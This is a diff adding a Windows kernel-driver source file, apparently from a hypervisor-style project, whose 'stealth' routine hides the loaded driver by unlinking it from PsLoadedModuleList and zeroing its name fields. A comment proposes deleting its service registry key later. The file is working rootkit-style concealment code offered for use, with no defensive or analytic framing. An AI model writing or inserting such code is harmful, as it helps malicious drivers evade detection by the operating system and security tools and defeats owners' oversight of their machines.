@@ -1,0 +1,66 @@
+#include <ntddk.h>
+#include "debug.h"
+
+#define YGHV_DEBUG_LOG
+
+/*
+ * ponytail: minimal stealth. Unlink from PsLoadedModuleList.
+ * Skip SCM key deletion (requires registry handle). Add when audit demands it.
+ */
+
+/* ponytail: forward-declare only the fields we need from LDR_DATA_TABLE_ENTRY.
+   Avoids ntifs.h / ntddk.h include conflict. Exact layout must match kernel. */
+typedef struct _KLDR_DATA_TABLE_ENTRY {
+    LIST_ENTRY InLoadOrderLinks;
+    PVOID ExceptionTable;
+    ULONG ExceptionTableSize;
+    PVOID GpValue;
+    PVOID NonPagedDebugInfo;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+    ULONG Flags;
+    USHORT LoadCount;
+} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;
+
+static void yghv_unlink_module(PDRIVER_OBJECT DriverObject) {
+    PLIST_ENTRY head = NULL;
+    UNICODE_STRING funcName;
+    PKLDR_DATA_TABLE_ENTRY entry;
+    PLIST_ENTRY le;
+
+    RtlInitUnicodeString(&funcName, L"PsLoadedModuleList");
+    head = (PLIST_ENTRY)MmGetSystemRoutineAddress(&funcName);
+    if (!head) {
+        LOG_INFO("yghv_unlink: PsLoadedModuleList not found");
+        return;
+    }
+
+    for (le = head->Flink; le != head; le = le->Flink) {
+        entry = CONTAINING_RECORD(le, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+        if (entry->DllBase == DriverObject->DriverStart) {
+            PLIST_ENTRY prev = le->Blink;
+            PLIST_ENTRY next = le->Flink;
+
+            prev->Flink = next;
+            next->Blink = prev;
+            le->Flink = le;
+            le->Blink = le;
+
+            RtlZeroMemory(&entry->BaseDllName, sizeof(entry->BaseDllName));
+            RtlZeroMemory(&entry->FullDllName, sizeof(entry->FullDllName));
+
+            LOG_INFO("yghv_unlink: removed from PsLoadedModuleList");
+            return;
+        }
+    }
+    LOG_INFO("yghv_unlink: self not found in module list");
+}
+
+NTSTATUS yghv_loader_stealth(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
+    (void)RegistryPath;
+    yghv_unlink_module(DriverObject);
+    return STATUS_SUCCESS;
+}
